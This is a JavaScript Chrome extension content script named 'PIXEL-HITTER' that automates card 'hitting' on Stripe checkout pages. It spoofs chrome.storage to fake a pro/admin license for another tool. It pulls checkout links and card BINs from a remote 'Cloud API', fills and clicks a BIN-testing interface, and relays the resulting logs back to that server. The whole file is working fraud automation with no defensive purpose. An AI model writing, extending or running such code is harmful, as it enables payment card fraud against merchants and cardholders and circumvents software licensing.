(function() {
    const DEBUG = true;
    if (DEBUG) console.log("--- PIXEL-HITTER ACTIVE ---");

    // --- 1. Storage Proxy (Keep 'Pro' state) ---
    if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
        const originalGet = chrome.storage.local.get;
        chrome.storage.local.get = function(keys, callback) {
            if (typeof callback !== 'function') return originalGet.apply(this, arguments);
            originalGet.call(this, keys, (items) => {
                const spoofed = { ...items, user_plan: 'pro', level: 'admin', is_logged_in: true, license: 'active' };
                callback(spoofed);
            });
        };
    }

    // --- 2. Element Finder (Ultra-Deep) ---
    function findElementDeep(selector, textMatch = null) {
        function search(root) {
            const elements = root.querySelectorAll(selector);
            for (const el of elements) {
                if (!textMatch || (el.innerText && el.innerText.toLowerCase().includes(textMatch.toLowerCase()))) {
                    return el;
                }
            }
            const all = root.querySelectorAll('*');
            for (const el of all) {
                if (el.shadowRoot) {
                    const found = search(el.shadowRoot);
                    if (found) return found;
                }
            }
            return null;
        }
        return search(document);
    }

    // --- 3. Run Automation ---
    const startAutomation = () => {
        // Only run on Stripe checkout pages
        if (!window.location.host.includes("stripe.com") && !window.location.host.includes("pay.checkout")) {
            return;
        }

        console.log("[Hitter] Checking for tasks from Cloud API...");
        
        chrome.runtime.sendMessage({ type: "FETCH_TASK" }, (task) => {
            if (!task || !task.link || !task.bin) {
                console.log("[Hitter] No valid task found.");
                return;
            }

            console.log("[Hitter] Task found! BIN:", task.bin);
            
            let attempts = 0;
            const checkUI = setInterval(() => {
                attempts++;
                
                // Try many selectors for BIN input
                const binInput = findElementDeep('input[placeholder*="BIN"]') || 
                                 findElementDeep('input[name*="bin"]') || 
                                 document.querySelector('#quickBinInput');

                // Try many selectors for Start button
                const startBtn = findElementDeep('button', 'Start') || 
                                 findElementDeep('div', 'Start') || 
                                 findElementDeep('span', 'Start') ||
                                 document.querySelector('#quickBinUseBtn');

                if (binInput && startBtn) {
                    clearInterval(checkUI);
                    console.log("[Hitter] UI Elements found! Auto-Starting...");

                    // Fill BIN
                    binInput.value = task.bin;
                    binInput.dispatchEvent(new Event('input', { bubbles: true }));
                    binInput.dispatchEvent(new Event('change', { bubbles: true }));

                    // Wait 500ms and click
                    setTimeout(() => {
                        console.log("[Hitter] Clicking Start Button...");
                        startBtn.click();
                        
                        // Fallback click (simulate mouse)
                        ['mousedown', 'click', 'mouseup'].forEach(evt => {
                           const e = new MouseEvent(evt, { view: window, bubbles: true, cancelable: true });
                           startBtn.dispatchEvent(e);
                        });

                        reportToCloud("STARTED", task.bin, "Automation triggered successfully.");
                        monitorLogs(task.bin);
                    }, 800);
                }

                if (attempts > 30) {
                    console.log("[Hitter] UI not found after 30 sec. Waiting...");
                    clearInterval(checkUI);
                }
            }, 1000);
        });
    };

    const reportToCloud = (status, bin, msg = "") => {
        chrome.runtime.sendMessage({ 
            type: "REPORT_LIVE", 
            data: { status: status, bin: bin, msg: msg } 
        });
    };

    const monitorLogs = (bin) => {
        let lastLog = "";
        setInterval(() => {
            const logElement = document.querySelector('#logs') || findElementDeep('textarea#logs');
            if (logElement) {
                const currentText = logElement.value || logElement.innerText;
                if (currentText !== lastLog) {
                    const newContent = currentText.replace(lastLog, "").trim();
                    if (newContent) {
                        console.log("[Hitter] New Log:", newContent);
                        reportToCloud("LOG", bin, newContent);
                    }
                    lastLog = currentText;
                }
            }
        }, 1500);
    };

    // Auto-Run loop
    setInterval(() => {
        if (!window.isHitterRunning) {
            window.isHitterRunning = true;
            startAutomation();
        }
    }, 5000);

})();
